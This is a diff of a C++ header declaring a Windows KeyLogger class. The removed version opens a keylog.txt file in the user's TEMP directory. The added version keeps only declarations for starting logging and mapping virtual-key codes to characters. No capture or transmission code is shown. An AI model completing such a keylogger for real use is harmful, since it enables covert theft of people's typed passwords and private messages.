@@ -1,52 +1,22 @@
 #ifndef KEYLOG_H
 #define KEYLOG_H
 
-#include <Windows.h>
-#include <mutex>
-#include <spdlog/spdlog.h>
 #include <string>
-
+#include <mutex>
+#include <chrono>
+#include <windows.h>
 
 class KeyLogger {
-private:
-  std::mutex logMutex;
-  bool running;
-  FILE *logFile;
-
-  // Convert virtual key code to readable character
+public:
+  KeyLogger(const std::string& filePath); // Constructor with file path
+  ~KeyLogger();
+  void StartLogging();
   std::string GetKeyName(int vkCode, bool shiftPressed, bool capsLock);
 
-public:
-  KeyLogger() : running(true), logFile(nullptr) {
-    // Initialize file logging and put the file in the temp directory
-    const char* tempPath = getenv("TEMP");
-    if (tempPath) {
-        std::string filePath = std::string(tempPath) + "\\keylog.txt";
-        logFile = fopen(filePath.c_str(), "w");
-    } else {
-        spdlog::error("Failed to get TEMP environment variable");
-    }
-    
-    if (!logFile) {
-      spdlog::error("Failed to open log file");
-    }
-
-    if (logFile) {
-      spdlog::info("Keylogger started");
-    } else {
-      spdlog::error("Keylogger failed to start");
-    }
-  }
-
-  ~KeyLogger() {
-    if (logFile) {
-      fclose(logFile);
-    }
-  }
-
-  void StartLogging();
-
-  void Stop() { running = false; }
+private:
+  bool running;
+  std::mutex logMutex;
+  FILE* logFile; // File pointer for logging
 };
 
-#endif /* KEYLOG_H */
+#endif
